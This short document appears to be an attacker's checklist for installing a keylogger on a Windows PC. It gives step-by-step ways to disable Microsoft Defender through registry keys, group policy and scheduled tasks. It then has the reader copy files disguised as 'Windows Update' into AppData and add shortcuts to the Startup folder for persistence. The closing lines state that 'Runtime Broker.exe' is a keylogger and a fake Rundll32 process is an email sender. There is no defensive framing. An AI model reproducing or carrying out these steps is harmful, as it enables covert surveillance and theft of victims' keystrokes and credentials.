1. shut down the antivirus:->

       if avast we know how to do it

M-1:-  if microsoft defender then do this:-
           go to windows security and turn off real-time protection and tamper protection
           Then go to registry->local machine->software->policies->microsoft->windows defender
           Then create a new key by right clicking on windows defender folder and name it 'Real-Time Protection'
           Then create a new DWORD(32-bit) file named 'DisableRealtimeProtection' and modify its value to 1.

M-2:-
go to windows security and turn off real-time protection and tamper protection

open Local Group Policy Editor
then go to:-
administrative template -> windows component -> microsoft defender antivirus -> real-time protection ->
turn off real-time protection -> [open & enable it] 

open task scheduler
go to:-
task scheduler library -> microsoft -> windows -> windows defender -> [disable all four of them]



2. copy and paste Wndows Update in """  %AppData%  """


3. copy and paste both shortcuts in startup forlder

       press win+r and open this directory
       
   """   %AppData%\Microsoft\Windows\Start Menu\Programs\startup   """




Runtime Broker.exe ----> keylogger

Windows Host Process (Rundll32).exe ------> email sender